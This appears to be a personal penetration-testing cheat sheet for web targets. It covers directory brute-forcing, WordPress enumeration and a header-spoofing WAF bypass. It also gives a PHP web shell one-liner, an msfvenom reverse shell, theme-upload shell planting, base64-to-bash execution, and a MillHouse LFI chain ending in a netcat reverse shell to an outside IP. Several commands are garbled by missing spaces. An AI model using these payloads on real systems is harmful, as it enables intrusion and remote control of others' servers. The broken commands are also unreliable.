## Directory Enumeration
Dirsearch
```
dirsearch -u url
```
FFUF
```
- ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u url -mc(to filter needed status codes), -e txt,php,csv,md,json,js,html,py,sh (extension),-fs 80 (filter response size 80)
```
Gobuster
```
gobuster dir -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 100 -x txt,php,csv,md,json,js,html,py,sh,pdf,config -u url
```
or
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt-xtxt,php,csv,md,json,js,html,py,sh,pdf,config -t 100 -u url
```
or use -k to ignore ssl verify
```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 100 -x txt,php,csv,md,json,js,html,py,sh,pdf -u url
```
Note : For FFUF use ‚ÄùAuthorization: Basic YWRtaW46YWRtaW4=" -H for header if needed

## Wordpress
enumerate users & vulnerable plugins
```
wpscan --url http://10.10.10.10 -e u,vp
```
or
```
wpscan --url "http://10.0.2.19/wordpress" -e at,ap,u
```
If username is admin try default credentials
( might consume lot time have this as last option try to identify password by any leakage or hint, enumeration)
Bruteforce with wpscan [[BruteForce#WPScan]]

### Upload Revshell
Try to create shell.php with php reverse shell payload in themes or plugin and try to open it with listening nc in kali (Need Write permission)  
Use php-reverse-shell.php 
or  
```
msfvenom -p php/meterpreter/reverse_tcp lhost=ip lport=port R (R for Raw Format)
``` 
If created in Appearance themes it will be in
/wordpress/wp-content/themes/twentynineteen/secret.php

## Analyze the response of request
```
curl http://IP-victim
```

## WAF Bypass
Got Access Denied ?
```
curl http://ip/logs
```
Try this : (hope success)
```
curl http://ip/logs -H "X-Forwaded-For: localhost"
```

## RCE 
PHP One Liner
```
<?phpsystem($_POST["cmd"]);?>
```
If you got RCE and reverse shell payload is not working. Try encoding it in base64.
```
echo "payload" | base64
```
in vulnerable parameter -> echo "b64 encoded payload" | base64 -d | bash
## API 
Creating a Pattern File to bruteforce using GoBuster 
{GOBUSTER}/v1  
{GOBUSTER}/v2

```
gobuster dir -u http://192.168.229.143 -w /usr/share/wordlists/dirb/big.txt -p pattern
```

Found MillHouse Web APP ?
- Register a user with name <?phpsystem($_POST["cmd"]);?>
- And try exploit - https://www.exploit-db.com/exploits/47121  
Login once and record REQUEST by burp suite, base on login request and modify it to continue and now,use LFI to include below PATH  
- /var/lib/php/sessions/sess_<mysession> 
such as,
- /var/lib/php/sessions/sess_qqqqqqqqqqqqqqqqqqqqqqqqqqq  
And write command you want to execute such as reverse shell in POST variability ,such as below(better to use your own revershell payload).
- &cmd=nc8.8.8.84444-e/bin/bash  
Now we have shell,and we can find local.txt in /var/www 
PE  
Execute sudo -l
